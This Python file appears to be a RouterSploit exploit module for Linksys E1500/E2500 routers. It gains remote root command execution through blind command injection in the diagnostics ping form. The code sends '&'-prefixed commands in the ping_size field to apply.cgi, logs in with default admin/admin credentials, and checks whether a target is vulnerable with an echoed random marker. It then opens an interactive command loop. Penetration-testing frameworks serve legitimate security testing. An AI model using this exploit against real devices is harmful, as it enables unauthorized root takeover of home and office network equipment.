from routersploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    print_info,
    random_text,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit for Linksys E1500 and E2500 devices Remote Code Execution vulnerability.
    If the target is vulnerable, command loop is invoked that allows executing commands with root privileges.
    """
    __info__ = {
        'name': 'Linksys E1500/E2500',
        'description': 'Module exploits remote command execution in Linksys E1500/E2500 devices.'
                       'Diagnostics interface allows executing root privileged shell commands is '
                       'available on dedicated web pages on the device.',
        'authors': [
            'Michael Messner',  # vulnerability discovery
            'Esteban Rodriguez (n00py)',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/24475/',
        ],
        'devices': [
            'Linksys E1500/E2500',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')
    username = exploits.Option('admin', 'Username to login with')
    password = exploits.Option('admin', 'Password to login with')

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            print_status("It is blind command injection - response is not available")
            self.command_loop()
        else:
            print_error("Target is not vulnerable")

    def command_loop(self):
        while 1:
            cmd = raw_input("cmd > ")

            if cmd in ['exit', 'quit']:
                return

            print_info(self.execute(cmd))

    def execute(self, cmd):
        url = "{}:{}/apply.cgi".format(self.target, self.port)
        data = {
            "submit_button": "Diagnostics",
            "change_action": "gozila_cgi",
            "submit_type": "start_ping",
            "action": "",
            "commit": "0",
            "ping_ip": "127.0.0.1",
            "ping_size": "&" + cmd,
            "ping_times": "5",
            "traceroute_ip": "127.0.0.1"
        }

        http_request(method="POST", url=url, data=data, auth=(self.username, self.password))
        return ""

    @mute
    def check(self):
        mark = random_text(32)
        cmd = "echo {}".format(mark)
        url = "{}:{}/apply.cgi".format(self.target, self.port)
        data = {
            "submit_button":
            "Diagnostics",
            "change_action": "gozila_cgi",
            "submit_type": "start_ping",
            "action": "",
            "commit": "0",
            "ping_ip": "127.0.0.1",
            "ping_size": "&" + cmd,
            "ping_times": "5",
            "traceroute_ip": "127.0.0.1"
        }

        response = http_request(method="POST", url=url, data=data, auth=(self.username, self.password))
        if response is None:
            return False  # target is not vulnerable

        if mark in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
